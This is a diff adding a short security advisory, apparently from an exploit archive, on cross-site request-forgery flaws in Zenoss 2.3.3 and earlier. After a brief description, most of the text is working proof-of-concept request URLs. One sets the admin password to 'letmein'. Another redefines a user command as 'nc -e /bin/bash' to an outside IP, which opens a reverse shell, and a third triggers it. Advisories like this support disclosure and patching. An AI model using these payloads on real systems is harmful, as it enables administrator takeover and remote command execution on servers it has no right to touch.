@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/37843/info
+
+Zenoss is prone to multiple cross-site request-forgery vulnerabilities.
+
+Exploiting these issues may allow a remote attacker to perform certain administrative actions, execute arbitrary commands, gain unauthorized access to the affected application, or delete certain data. Other attacks are also possible.
+
+Zenoss 2.3.3 is vulnerable; prior versions are also vulnerable. 
+
+
+http://www.example.com/zport/dmd/ZenUsers/admin?defaultAdminLevel:int=1&defaultAdminRole=ZenUser&defaultPageSize:int=40&email=&eventConsoleRefresh: boolean=True&manage_editUserSettings:method=Save&netMapStartObject=&pager=& password=letmein&sndpassword=letmein&zenScreenName=editUserSettings
+
+http://www.example.com/zport/dmd/userCommands/ping?command:text=nc -e /bin/bash 172.16.28.6 443&commandId=ping&description:text=& manage_editUserCommand:method=Save&zenScreenName=userCommandDetail
+
+http://www.example.com/zport/dmd/Devices/devices/localhost/manage_doUserCommand?commandId=ping 
